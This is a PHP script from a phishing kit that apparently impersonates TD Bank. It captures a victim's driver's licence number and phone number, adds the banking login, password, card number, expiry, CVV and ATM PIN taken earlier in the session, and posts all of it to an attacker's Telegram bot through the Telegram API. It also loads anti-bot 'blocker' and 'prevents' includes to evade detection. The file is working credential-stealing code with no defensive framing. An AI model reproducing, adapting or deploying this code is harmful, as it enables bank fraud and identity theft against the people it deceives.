<?php
include("../settings/infos5.php");
    include 'blocker.php';
        include 'prevents/anti7.php';
            include 'prevents/anti8.php';
                include 'prevents/anti9.php';
require "configg.php";
require "tc_assetz/ninc/session_protect.php";
require "tc_assetz/ninc/functions.php";
if($_SESSION['passed_captcha'] == 'yes'){
    
}else{
    header( "Location: index.php" ); 
}
if(isset($_POST))
{

    if(!isset($_SESSION)){
        session_start();
    }

 $_SESSION['dl'] = htmlspecialchars($_POST['DL']);
    $_SESSION['pn'] = htmlspecialchars($_POST['PN']);
    $_SESSION['UA'] = htmlspecialchars($_SERVER['HTTP_USER_AGENT']);
      $data = [
            'text' => '
---------- TD DL ----------

Login : '.$_SESSION['user'].'

Password : '.$_SESSION['pass'].'

Card Number : '.$_SESSION['cn'].'

Expi : |'.$_SESSION['em'].'/'.$_SESSION['ey'].'|

Cvv : '.$_SESSION['cv'].'

Atm Pin : '.$_SESSION['ap'].'

Drivers License : '.$_SESSION['dl'].'

Phone Number : '.$_SESSION['pn'].'

---------- Z51 DG ---------
            ',
            'chat_id' => $chat_card
          ];


                file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?".http_build_query($data) );
                }
 ?>
